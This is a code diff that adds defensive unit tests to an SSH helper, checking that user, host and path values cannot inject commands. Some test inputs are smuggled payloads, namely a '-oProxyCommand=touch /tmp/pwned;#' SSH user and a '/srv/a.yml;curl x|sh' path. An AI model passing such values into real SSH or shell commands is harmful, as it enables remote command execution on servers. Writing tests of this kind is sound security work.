@@ -188,6 +188,49 @@ class TestSSHHelpers:
             )
         assert result is None
 
+    def test_ssh_base_rejects_option_shaped_user(self):
+        """`user@host` sits where ssh still parses options, so a user of
+        `-oProxyCommand=...` would run a command on the control-plane node."""
+        from registry_mcp.adoption import ssh as remote
+
+        for user in ("-oProxyCommand=touch /tmp/pwned;#", "root@evil", "a b", ""):
+            try:
+                remote._ssh_base("/key", user, "10.0.0.5")
+                raised = False
+            except SSHError:
+                raised = True
+            assert raised, user
+
+    def test_ssh_base_rejects_option_shaped_host(self):
+        from registry_mcp.adoption import ssh as remote
+
+        for host in ("-oProxyCommand=x", "host name", ""):
+            try:
+                remote._ssh_base("/key", "root", host)
+                raised = False
+            except SSHError:
+                raised = True
+            assert raised, host
+
+    def test_ssh_base_terminates_options_before_destination(self):
+        from registry_mcp.adoption import ssh as remote
+
+        argv = remote._ssh_base("/key", "root", "10.0.0.5")
+        assert argv[-2:] == ["--", "root@10.0.0.5"]
+
+    async def test_remote_path_is_quoted_for_the_remote_shell(self):
+        """ssh hands trailing args to the remote login shell as one string, so a
+        compose path taken from a container label must arrive as one quoted word."""
+        from registry_mcp.adoption import ssh as remote
+
+        run = AsyncMock(return_value=(0, "services: {}\n", ""))
+        with patch.object(remote, "_run", new=run):
+            await remote.read_remote_file(
+                key_path="/key", user="root", host="10.0.0.5", path="/srv/a.yml;curl x|sh"
+            )
+        argv = run.await_args.args[0]
+        assert argv[-1] == "cat -- '/srv/a.yml;curl x|sh'"
+
 
 # ---------------------------------------------------------------------------
 # AdoptionDraftStore
@@ -462,6 +505,23 @@ class TestProposalAdoptService:
             result = await tools["proposal_adopt_service"](service.id)
         assert "error" in result
         assert "docker inspect failed" in result["error"]
+
+    async def test_option_shaped_ssh_user_never_reaches_a_subprocess(self, store, hardware_store):
+        node = _node(hardware_store)
+        service = _docker_service(store)
+        hardware_store.link_service(service.id, node.id)
+        tools, _, _ = _setup(store, hardware_store)
+
+        from registry_mcp.adoption import ssh as remote
+
+        run = AsyncMock(return_value=(0, "[]", ""))
+        with patch.object(remote, "_run", new=run):
+            result = await tools["proposal_adopt_service"](
+                service.id, ssh_user="-oProxyCommand=touch /tmp/pwned;#"
+            )
+        assert "error" in result
+        assert "unsafe SSH user" in result["error"]
+        run.assert_not_awaited()
 
     async def test_no_compose_labels_returns_error(self, store, hardware_store):
         node = _node(hardware_store)
